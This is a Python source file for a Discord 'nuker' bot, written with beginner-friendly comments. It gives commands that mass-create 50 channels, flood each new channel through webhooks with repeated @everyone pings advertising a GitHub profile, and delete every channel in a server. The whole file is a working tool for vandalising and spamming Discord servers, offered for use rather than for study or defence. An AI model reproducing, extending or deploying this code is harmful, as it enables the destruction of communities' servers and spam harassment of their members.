import requests # these are our modules imported. if the application doesnt open make sure to run setup.bat and install python then add to PATH
from requests import *
import discord
from discord.ext import commands
import colorama
from colorama import *
import ctypes
import os
import time
import datetime
import sys

plus = f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} "
tme = (Back.BLACK + Fore.LIGHTMAGENTA_EX + time.strftime("%H:%M:%S ", time.gmtime()) + Back.RESET + Fore.WHITE + Style.BRIGHT)
message_to_spam = "@everyone 11gn -> https://github.com/11gn "

intents=discord.Intents.all() #turn all of them on for the bot in https://discord.com/developers/applications
nuker = commands.Bot(command_prefix='.', intents=intents) # command prefix is used for the commands of your bot, .nuke .help etc




"""
UPDATED ON 23/03/2024
------------------------

- ADDED A PINGER WHEN THE CHANNEL IS CREATED
- ADDED AN ARGUEMENT SO YOU CAN CHANGE THE CHANNEL NAME TO WHATEVER YOU WANT
"""



@nuker.event
async def on_ready():
    print(plus  +  tme + "Logged In As " + Fore.RED + nuker.user.name)

@nuker.event
async def on_guild_channel_create(channel): # this event basically means when the bot is in the server and a channel is created it spams ur preffered msg
      webhook = await channel.create_webhook(name="TEST | CHANGE TO WTV U WANT!")

      for _ in range(5): # the number is how much pings per channel but remember about rate limits
            await webhook.send(message_to_spam)
      


@nuker.command()
async def nuke(ctx, message_parts: str): # this command creates the channels, str means string so u can put wtv channel name without changing it here, Like serenity!
        
       for i in range(50): # the 50 inside the parenthesis/brackets are how many channels are created. please make sure if u do lots then you could get ratelimited!!!
             try:
                  await ctx.guild.create_text_channel(name=message_parts)
             except:
                   pass
             
@nuker.command() # decided to make a shitty delete all channels :) 
async def delall(ctx):
    guild = ctx.guild
    print(plus + "| " + tme + "| Deleting Channels")
    for channel in guild.channels:
          await channel.delete()

           
             

      

nuker.run('BOT TOKEN HERE') # bot token here
